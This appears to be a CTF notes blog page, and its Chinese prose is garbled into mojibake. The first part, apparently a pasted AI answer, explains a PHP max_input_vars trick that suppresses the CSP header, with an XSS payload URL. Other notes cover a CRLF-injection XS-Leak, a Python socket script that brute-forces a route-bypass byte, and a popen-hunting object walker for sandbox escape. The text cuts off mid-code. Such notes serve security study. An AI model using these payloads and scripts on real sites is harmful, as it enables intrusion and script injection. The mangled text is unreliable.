<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">æ ¹æ®æœç´¢ç»“æœï¼Œæ‚¨æä¾›çš„é“¾æ¥æŒ‡å‘çš„æ¨æ–‡ï¼ˆæ¥è‡ª @pilvar222ï¼‰è®¨è®ºçš„æ˜¯ PHP ä¸­çš„ä¸€ä¸ªç‰¹æ€§ï¼ˆæˆ–æ›´å‡†ç¡®åœ°è¯´ï¼Œæ˜¯ä¸€ä¸ªé…ç½®é¡¹ï¼‰â€”â€”max_input_varsã€‚</span><br><span class="line"></span><br><span class="line">è¿™ä¸ªç‰¹æ€§æ˜¯ PHP ç”¨æ¥é™åˆ¶å•ä¸ªè¯·æ±‚ï¼ˆå¦‚ GET, POST æˆ– COOKIEï¼‰ä¸­æ‰€èƒ½æ¥å—çš„è¾“å…¥å˜é‡çš„æœ€å¤§æ•°é‡ã€‚</span><br><span class="line"></span><br><span class="line">è¯¦ç»†è§£é‡Šï¼š</span><br><span class="line">æ˜¯ä»€ä¹ˆ (What)ï¼Ÿ max_input_vars æ˜¯åœ¨ php.ini é…ç½®æ–‡ä»¶ä¸­çš„ä¸€ä¸ªæŒ‡ä»¤ã€‚å®ƒå®šä¹‰äº† PHP è„šæœ¬åœ¨ä¸€æ¬¡è¯·æ±‚ä¸­å¯ä»¥å¤„ç†çš„æœ€å¤§å˜é‡æ•°é‡ã€‚</span><br><span class="line"></span><br><span class="line">ä¸ºä»€ä¹ˆ (Why)ï¼Ÿ è¿™ä¸ªé™åˆ¶ä¸»è¦æ˜¯å‡ºäºå®‰å…¨è€ƒè™‘ã€‚å¦‚æœä¸è®¾é™åˆ¶ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå‘é€ä¸€ä¸ªåŒ…å«æµ·é‡å˜é‡çš„è¯·æ±‚ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªéå¸¸åºå¤§çš„ POST è¡¨å•ï¼‰ã€‚è¿™å¯èƒ½ä¼šæ¶ˆè€—æœåŠ¡å™¨å¤§é‡çš„èµ„æºï¼ˆCPU å’Œå†…å­˜ï¼‰æ¥è§£æè¿™äº›å˜é‡ï¼Œå¯¼è‡´æœåŠ¡å™¨æ€§èƒ½ä¸‹é™ç”šè‡³å´©æºƒï¼Œè¿™æ˜¯ä¸€ç§æ½œåœ¨çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚</span><br><span class="line"></span><br><span class="line">é»˜è®¤å€¼ (Default Value)ï¼Ÿ åœ¨ PHP <span class="number">5.3</span><span class="number">.9</span> åŠä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªå€¼çš„é»˜è®¤è®¾ç½®é€šå¸¸æ˜¯ <span class="number">1000</span>ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚ä½•å·¥ä½œ (How)ï¼Ÿ å½“ä¸€ä¸ª HTTP è¯·æ±‚ï¼ˆä¾‹å¦‚ç”¨æˆ·æäº¤è¡¨å•ï¼‰åˆ°è¾¾æœåŠ¡å™¨æ—¶ï¼ŒPHP ä¼šå¼€å§‹è§£æè¯·æ±‚ä¸­çš„æ•°æ®ï¼ˆå¦‚ foo=bar&amp;baz=qux...ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœè¯·æ±‚ä¸­çš„å˜é‡æ•°é‡å°äºæˆ–ç­‰äº max_input_vars çš„é™åˆ¶ï¼ˆä¾‹å¦‚ <span class="number">1000</span>ï¼‰ï¼Œæ‰€æœ‰å˜é‡éƒ½ä¼šè¢«æ­£å¸¸è§£æå¹¶å¡«å……åˆ° <span class="symbol">$</span>_GETã€<span class="symbol">$</span>_POST æˆ– <span class="symbol">$</span>_COOKIE ç­‰è¶…å…¨å±€æ•°ç»„ä¸­ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœè¯·æ±‚ä¸­çš„å˜é‡æ•°é‡è¶…è¿‡äº†è¿™ä¸ªé™åˆ¶ï¼ˆä¾‹å¦‚ <span class="number">1001</span> ä¸ªï¼‰ï¼ŒPHP ä¼šåœæ­¢è§£æã€‚å®ƒä¼šæ¥å—å‰ <span class="number">1000</span> ä¸ªå˜é‡ï¼Œè€Œç¬¬ <span class="number">1001</span> ä¸ªåŠä¹‹åçš„æ‰€æœ‰å˜é‡éƒ½å°†è¢«ä¸¢å¼ƒï¼Œå¹¶ä¸” PHP ä¼šäº§ç”Ÿä¸€ä¸ª E_WARNING çº§åˆ«çš„é”™è¯¯ã€‚</span><br><span class="line"></span><br><span class="line">æ½œåœ¨çš„å®‰å…¨é£é™©ï¼ˆæ¨æ–‡å¯èƒ½è®¨è®ºçš„é‡ç‚¹ï¼‰ï¼š</span><br><span class="line">è¿™ä¸ªâ€œæˆªæ–­â€è¡Œä¸ºå¯èƒ½ä¼šå¼•å…¥ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œå°¤å…¶æ˜¯å½“åº”ç”¨ç¨‹åºçš„é€»è¾‘ä¾èµ–äºé‚£äº›â€œå¯èƒ½è¢«æˆªæ–­â€çš„å˜é‡æ—¶ã€‚</span><br><span class="line"></span><br><span class="line">ä¸¾ä¸ªä¾‹å­ï¼š å‡è®¾ä¸€ä¸ªåº”ç”¨æœ‰ä¸€ä¸ªæ›´æ–°ç”¨æˆ·è®¾ç½®çš„è¡¨å•ï¼Œå®ƒå‘é€äº† <span class="number">1001</span> ä¸ªå˜é‡ã€‚æœ€åä¸€ä¸ªå˜é‡ï¼ˆç¬¬ <span class="number">1001</span> ä¸ªï¼‰å¯èƒ½æ˜¯ä¸€ä¸ªå…³é”®çš„å®‰å…¨ä»¤ç‰Œï¼ˆå¦‚ CSRF tokenï¼‰æˆ–è€…æ˜¯ä¸€ä¸ªâ€œç¡®è®¤â€æŒ‰é’®çš„å€¼ã€‚</span><br><span class="line"></span><br><span class="line">POST Data:</span><br><span class="line">var_1=a</span><br><span class="line">var_2=b</span><br><span class="line">...</span><br><span class="line">var_999=y</span><br><span class="line">var_1000=z</span><br><span class="line">var_1001=security_token_value  &lt;-- æ”»å‡»è€…æ•…æ„æ„é€ çš„ç¬¬<span class="number">1001</span>ä¸ªå˜é‡</span><br><span class="line">å¦‚æœ max_input_vars æ˜¯ <span class="number">1000</span>ï¼š</span><br><span class="line"></span><br><span class="line">æœåŠ¡å™¨åªä¼šæ¥æ”¶åˆ° var_1 åˆ° var_1000ã€‚</span><br><span class="line"></span><br><span class="line">var_1001ï¼ˆå³ security_token_valueï¼‰ä¼šè¢«ä¸¢å¼ƒã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœåº”ç”¨ç¨‹åºçš„ å®‰å…¨æ£€æŸ¥é€»è¾‘æ˜¯ <span class="string">"IF security_token is present AND valid THEN..."</span>ï¼Œç”±äº security_token æ ¹æœ¬ä¸å­˜åœ¨äº <span class="symbol">$</span>_POST æ•°ç»„ä¸­ï¼Œè¿™ä¸ªæ£€æŸ¥å¯èƒ½ä¼šè¢«æ„å¤–ç»•è¿‡ã€‚</span><br><span class="line"></span><br><span class="line">Tenable çš„ä¸€ç¯‡åˆ†ææ–‡ç« ï¼ˆåœ¨æœç´¢ç»“æœä¸­è¢«å¼•ç”¨ï¼‰å°±æåˆ°äº†è¿™ä¸€ç‚¹ï¼Œå³è¿™ç§å˜é‡æˆªæ–­å¯èƒ½è¢«ç”¨æ¥ç»•è¿‡æŸäº›å®‰å…¨æ£€æŸ¥æˆ–å‡½æ•°è°ƒç”¨ã€‚æ¨æ–‡ä½œè€…ï¼ˆ@pilvar222ï¼‰å¾ˆå¯èƒ½æ˜¯åœ¨æ¼”ç¤ºæˆ–è®¨è®ºè¿™ç§ç”± max_input_vars é™åˆ¶å¯¼è‡´çš„æ¼æ´ã€‚</span><br><span class="line"></span><br><span class="line">æ€»ç»“ï¼š</span><br><span class="line">è¿™ä¸ªç‰¹æ€§æ˜¯ PHP çš„ä¸€ä¸ªå†…ç½®å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé˜²æ­¢ DoS æ”»å‡»ã€‚ç„¶è€Œï¼Œå¦‚æœå¼€å‘è€…ä¸äº†è§£è¿™ä¸ªé™åˆ¶ï¼Œæˆ–è€…æ”»å‡»è€…æ¶æ„åˆ©ç”¨è¿™ä¸ªâ€œæˆªæ–­â€è¡Œä¸ºï¼Œå®ƒå°±å¯èƒ½åè¿‡æ¥æˆä¸ºä¸€ä¸ªå®‰å…¨æ¼æ´çš„å…¥å£ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ‚¨é—®åˆ°äº†ç‚¹å­ä¸Šäº†ã€‚æ‚¨å‘çš„è¿™ä¸ªæ¨æ–‡ï¼ˆä»¥åŠå®ƒèƒŒåè®¨è®ºçš„æŠ€æœ¯ï¼‰ç¡®å®æ˜¯å…³äºä¸€ä¸ªéå¸¸å·§å¦™çš„ CSP ç»•è¿‡æŠ€å·§ï¼Œè€Œè¿™ä¸ªæŠ€å·§çš„æ ¸å¿ƒå°±æ˜¯åˆ©ç”¨æˆ‘ä¸Šæ¬¡æåˆ°çš„ max_input_varsã€‚</span><br><span class="line"></span><br><span class="line">è¿™ï¼ˆmax_input_varsï¼‰æœ¬èº«ä¸æ˜¯ CSP æ¼æ´ï¼Œä½†å®ƒçš„ä¸€ä¸ªå‰¯ä½œç”¨å¯ä»¥è¢«ç”¨æ¥**â€œæ¯’å®³â€**æœåŠ¡å™¨çš„å“åº”ï¼Œä»è€Œä½¿ CSP æ ‡å¤´å¤±æ•ˆã€‚</span><br><span class="line"></span><br><span class="line">ç»•è¿‡åŸç†ï¼šâ€æ ‡å¤´å‰ç½®â€œè§„åˆ™</span><br><span class="line">è¿™ä¸ªç»•è¿‡çš„æ ¸å¿ƒåŸç†ï¼Œåœ¨äº PHP çš„ä¸€ä¸ªåŸºç¡€è§„åˆ™ï¼š</span><br><span class="line"></span><br><span class="line">header() å‡½æ•°å¿…é¡»åœ¨ä»»ä½•å®é™…è¾“å‡ºï¼ˆHTMLã€æ–‡æœ¬ï¼Œç”šè‡³æ˜¯ä¸€ä¸ªç©ºæ ¼ï¼‰ä¹‹å‰è¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line">Content-Security-Policy (CSP) æ˜¯é€šè¿‡ HTTP æ ‡å¤´ï¼ˆHeaderï¼‰å‘é€ç»™æµè§ˆå™¨çš„ã€‚åœ¨ PHP ä¸­ï¼Œè¿™æ„å‘³ç€å¼€å‘è€…ä¼šä½¿ç”¨ header(<span class="string">"Content-Security-Policy: ..."</span>) è¿™æ ·çš„ä»£ç æ¥è®¾ç½®å®ƒã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœ PHP è„šæœ¬åœ¨è°ƒç”¨ header() ä¹‹å‰ä¸å°å¿ƒè¾“å‡ºäº†ä»»ä½•å†…å®¹ï¼ˆå“ªæ€•æ˜¯ä¸€ä¸ª Warning è­¦å‘Šä¿¡æ¯ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ª header() è°ƒç”¨å°†é™é»˜å¤±è´¥ï¼ŒCSP æ ‡å¤´æ ¹æœ¬ä¸ä¼šè¢«å‘é€ã€‚</span><br><span class="line"></span><br><span class="line">max_input_vars çš„å¦™ç”¨ï¼ˆæ”»å‡»é“¾ï¼‰</span><br><span class="line">@pilvar222 å±•ç¤ºçš„æŠ€å·§å°±æ˜¯å¦‚ä½•å¼ºåˆ¶ PHP åœ¨ header() å‡½æ•°è¢«è°ƒç”¨ä¹‹å‰äº§ç”Ÿè¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line">æ”»å‡»è€…çš„ç›®æ ‡ï¼š ç½‘ç«™ä¸Šæœ‰ä¸€ä¸ª XSS æ¼æ´ï¼ˆä¾‹å¦‚ echo <span class="symbol">$</span>_GET[<span class="string">'xss'</span>];ï¼‰ï¼Œä½†å®ƒè¢«ä¸€ä¸ªä¸¥æ ¼çš„ CSP ç­–ç•¥ï¼ˆå¦‚ default-src <span class="string">'self'</span>ï¼‰æ‰€ä¿æŠ¤ï¼Œå¯¼è‡´è„šæœ¬æ— æ³•æ‰§è¡Œã€‚</span><br><span class="line"></span><br><span class="line">max_input_vars çš„å‰¯ä½œç”¨ï¼š å½“ PHP æ”¶åˆ°çš„è¾“å…¥å˜é‡ï¼ˆä¾‹å¦‚ GET å‚æ•°ï¼‰æ•°é‡è¶…è¿‡äº† php.ini ä¸­è®¾å®šçš„ max_input_vars å€¼ï¼ˆé»˜è®¤ <span class="number">1000</span>ï¼‰æ—¶ï¼ŒPHP ä¸ä»…ä¼šæˆªæ–­å˜é‡ï¼Œå®ƒè¿˜ä¼šåœ¨å“åº”çš„æœ€å¼€å¤´è‡ªåŠ¨è¾“å‡ºä¸€ä¸ª Warningï¼ˆè­¦å‘Šï¼‰ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚ï¼š&lt;b&gt;Warning&lt;/b&gt;: Input <span class="keyword">variables</span> exceeded <span class="comment">1000...</span></span><br><span class="line"></span><br><span class="line">ç»„åˆæ”»å‡»ï¼š æ”»å‡»è€…ç°åœ¨æ„é€ ä¸€ä¸ªæ¶æ„ URLï¼Œè¿™ä¸ª URL åŒæ—¶åŒ…å«<span class="comment"> XSS</span> è´Ÿè½½å’Œè¶…è¿‡<span class="comment"> 1000</span> ä¸ªçš„â€œåƒåœ¾â€å‚æ•°ã€‚</span><br><span class="line"></span><br><span class="line">æ­£å¸¸ URL <span class="comment">(</span>è¢«<span class="comment"> CSP</span> æ‹¦æˆª<span class="comment">): https:</span>//<span class="comment">example.com</span>/page.php?xss=&lt;svg/<span class="comment">onload=alert(1)&gt;</span></span><br><span class="line"></span><br><span class="line">å“åº”: HTTP/<span class="number">1.1</span> <span class="number">200</span> OK Content-Security-Policy: default-src <span class="comment">'self'</span> ... &lt;svg/onload=alert(1)&gt; (ä¸æ‰§è¡Œ)</span><br><span class="line"></span><br><span class="line">æ¶æ„ URL <span class="comment">(</span>ç»•è¿‡<span class="comment"> CSP): https:</span>//<span class="comment">example.com</span>/page.php?xss=&lt;svg/<span class="comment">onload=alert(1)&gt;&amp;a=1&amp;a=2&amp;a=3&amp;...&amp;a=1001</span></span><br><span class="line"></span><br><span class="line">æœåŠ¡å™¨å¤„ç†æµç¨‹:</span><br><span class="line"></span><br><span class="line">PHP å¼€å§‹å¤„ç†è¯·æ±‚ã€‚</span><br><span class="line"></span><br><span class="line">PHP å‘ç°æœ‰<span class="comment"> 1002</span> ä¸ªï¼ˆ<span class="comment">xss + 1001</span> ä¸ª<span class="comment"> a</span>ï¼‰è¾“å…¥å˜é‡ï¼Œè¶…è¿‡äº†<span class="comment"> 1000</span> çš„é™åˆ¶ã€‚</span><br><span class="line"></span><br><span class="line">PHP ç«‹å³å‘å“åº”ä½“è¾“å‡ºè­¦å‘Šï¼š<span class="comment">&lt;b&gt;Warning&lt;</span>/b&gt;: Input variables exceeded...</span><br><span class="line"></span><br><span class="line">page.php è„šæœ¬ç»§ç»­æ‰§è¡Œï¼Œå®ƒå°è¯•è®¾ç½® CSPï¼šheader(<span class="comment">"Content-Security-Policy: ..."</span>)ã€‚</span><br><span class="line"></span><br><span class="line">å› ä¸ºå‰é¢å·²ç»æœ‰äº†è¾“å‡ºï¼ˆé‚£ä¸ª Warningï¼‰ï¼Œheader() å‡½æ•°è°ƒç”¨å¤±è´¥ã€‚</span><br><span class="line"></span><br><span class="line">è„šæœ¬ç»§ç»­æ‰§è¡Œï¼Œæœ€åè¾“å‡º XSS è´Ÿè½½ï¼šecho $_GET[<span class="comment">'xss'</span>];</span><br><span class="line"></span><br><span class="line">æœ€ç»ˆå“åº” (å‘é€ç»™æµè§ˆå™¨): HTTP/<span class="comment">1.1 200 OK (</span>æ²¡æœ‰<span class="comment"> CSP</span> æ ‡å¤´<span class="comment">!) ... &lt;b&gt;Warning&lt;</span>/b&gt;: Input variables exceeded... &lt;svg/<span class="comment">onload=alert(1)&gt; (</span>æˆåŠŸæ‰§è¡Œ<span class="comment">!)</span></span><br><span class="line"></span><br><span class="line">æ€»ç»“</span><br><span class="line">è¿™ä¸ªæŠ€å·§çš„ç²¾é«“åœ¨äºï¼šåˆ©ç”¨ max_input_vars è¿™ä¸ªç”¨äºé˜²èŒƒ<span class="comment"> DoS</span> çš„å®‰å…¨ç‰¹æ€§ï¼Œä½¿å…¶äº§ç”Ÿä¸€ä¸ªâ€œæœ‰å‰¯ä½œç”¨â€çš„è­¦å‘Šè¾“å‡ºï¼Œè¿™ä¸ªè¾“å‡ºç ´åäº†<span class="comment"> CSP</span> æ ‡å¤´è®¾ç½®çš„å‰ææ¡ä»¶ï¼Œæœ€ç»ˆå¯¼è‡´<span class="comment"> CSP</span> ç­–ç•¥è¢«å®Œå…¨ç§»é™¤ï¼Œä»è€Œä½¿<span class="comment"> XSS</span> æ”»å‡»å¾—ä»¥æˆåŠŸã€‚</span><br><span class="line"></span><br><span class="line">è¿™åœ¨ CTF æŒ‘æˆ˜å’Œç°å®ä¸–ç•Œçš„æ¼æ´æŒ–æ˜ä¸­éƒ½æ˜¯ä¸€ä¸ªéå¸¸é«˜çº§å’Œå·§å¦™çš„æŠ€å·§ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="Devil-Net-v2"><a href="#Devil-Net-v2" class="headerlink" title="Devil Net v2"></a>Devil Net v2</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªè§£æ³•æ¯”æˆ‘ä¹‹å‰æåˆ°çš„â€œHeader é‡å®šå‘â€è¦é«˜çº§å¾—å¤šï¼Œä¹Ÿæ›´ç¬¦åˆé«˜è´¨é‡ CTF é¢˜ç›®çš„è€ƒç‚¹ã€‚è¿™æ˜¯ä¸€ç§åŸºäº CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰Oracle å’Œ HTTP å“åº”æˆªæ–­ çš„ XS-Leakï¼ˆè·¨ç«™æ³„éœ²ï¼‰æ”»å‡»ã€‚</span><br><span class="line"></span><br><span class="line">æ ¸å¿ƒåŸç†æ€»ç»“</span><br><span class="line">è¿™ä¸ªè„šæœ¬åˆ©ç”¨äº† CRLF æ³¨å…¥æ¼æ´åšäº†ä¸‰ä»¶äº‹ï¼Œç»„åˆèµ·æ¥å®ç°é€å­—èŠ‚çˆ†ç ´ Flagï¼š</span><br><span class="line"></span><br><span class="line">ä¸Šä¸‹æ–‡ç¯¡æ”¹ (<span class="keyword">Context</span> Confusion)ï¼šé€šè¿‡æ³¨å…¥ &lt;style&gt; æ ‡ç­¾ï¼Œå¼ºè¡Œè®©æµè§ˆå™¨æŠŠåŸæœ¬æ˜¯ HTML çš„é¡µé¢å†…å®¹è§£æä¸º CSS æ ·å¼è¡¨ã€‚</span><br><span class="line"></span><br><span class="line">å“åº”æˆªæ–­ (Response Truncation)ï¼šé€šè¿‡æ³¨å…¥æ¶æ„çš„ Content-<span class="keyword">Length</span> å¤´ï¼Œæ§åˆ¶æµè§ˆå™¨åªè¯»å–é¡µé¢çš„ä¸€å°éƒ¨åˆ†ï¼ˆåˆšå¥½è¯»åˆ°æˆ‘ä»¬çŒœæµ‹çš„ Flag å­—ç¬¦ä½ç½®ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">CSP å“ˆå¸Œé¢„è¨€æœº (CSP <span class="keyword">Hash</span> Oracle)ï¼šåˆ©ç”¨ Content-Security-Policy-Report-Only å¤´ï¼Œå‘Šè¯‰æµè§ˆå™¨ï¼šâ€œå¦‚æœè¿™æ®µ CSS å†…å®¹çš„å“ˆå¸Œå€¼ä¸æ˜¯æˆ‘ç®—å‡ºæ¥çš„è¿™ä¸ªï¼Œå°±å‘ä¸ªæŠ¥é”™æŠ¥å‘Šç»™æˆ‘â€ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.31.34"</span></span><br><span class="line">port = <span class="number">3002</span></span><br><span class="line">data = &#123;<span class="string">"ixxp"</span>: <span class="string">"192.168.31.34"</span>&#125;</span><br><span class="line">body = json.dumps(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">b"POST /ping%2f.."</span>+ bytes([byte]) + <span class="string">b"/debug"</span> + <span class="string">b" HTTP/1.1\r\n"</span></span><br><span class="line">        <span class="string">b"Host: "</span> + host.encode() + <span class="string">b"\r\n"</span></span><br><span class="line">        <span class="string">b"Content-Type: application/json\r\n"</span></span><br><span class="line">        <span class="string">b"Content-Length: "</span> + str(len(body)).encode() + <span class="string">b"\r\n"</span></span><br><span class="line">        <span class="string">b"Connection: close\r\n"</span></span><br><span class="line">        <span class="string">b"\r\n"</span> + body.encode()</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.sendall(request)</span><br><span class="line">        response = s.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"address"</span> <span class="keyword">in</span> response:</span><br><span class="line">            print(response)</span><br><span class="line">            print(<span class="string">f"Bypass found with byte \\x<span class="subst">&#123;byte:<span class="number">02</span>x&#125;</span>"</span>)</span><br></pre></td></tr></table></figure>

 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">obj_walker</span><span class="params">(obj,searcher,filter,depth=<span class="number">10</span>)</span>:</span></span><br><span class="line">    visited = set()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">()</span>:</span></span><br><span class="line">        stack = inspect.stack()</span><br><span class="line">        path = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> stack:</span><br><span class="line">            <span class="keyword">if</span>(i.function == <span class="string">"dfs"</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    path.append(i.frame.f_locals[<span class="string">'name'</span>])</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">raise</span> e</span><br><span class="line">        print(<span class="string">'.'</span>.join(path[::<span class="number">-1</span>]))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(current,d,name,visited)</span>:</span></span><br><span class="line">        visited = set(visited)</span><br><span class="line">        <span class="keyword">if</span> filter(name):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> searcher(current):</span><br><span class="line">            backtrace()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> id(current) <span class="keyword">in</span> visited:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> d &gt; depth:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        visited.add(id(current))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dir(current):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                next = getattr(current,i)</span><br><span class="line">                dfs(next,d+<span class="number">1</span>,i,visited)</span><br><span class="line">            <span class="keyword">except</span> AttributeError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(current, dict):</span><br><span class="line">            <span class="keyword">for</span> k,v <span class="keyword">in</span> current.items():</span><br><span class="line">                dfs(k,d+<span class="number">1</span>,<span class="string">f'[<span class="subst">&#123;k&#125;</span>]'</span>,visited)</span><br><span class="line">                dfs(v,d+<span class="number">1</span>,<span class="string">f'[<span class="subst">&#123;k&#125;</span>]'</span>,visited)</span><br><span class="line">        <span class="keyword">if</span> isinstance(current, list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> next <span class="keyword">in</span> current:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                dfs(next,d+<span class="number">1</span>,<span class="string">f'[<span class="subst">&#123;i&#125;</span>]'</span>,visited)</span><br><span class="line">    dfs(obj,<span class="number">0</span>,<span class="string">''</span>,visited)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">searcher</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> hasattr(i,<span class="string">'__name__'</span>) <span class="keyword">and</span> i.__name__ == <span class="string">'popen'</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'__'</span> <span 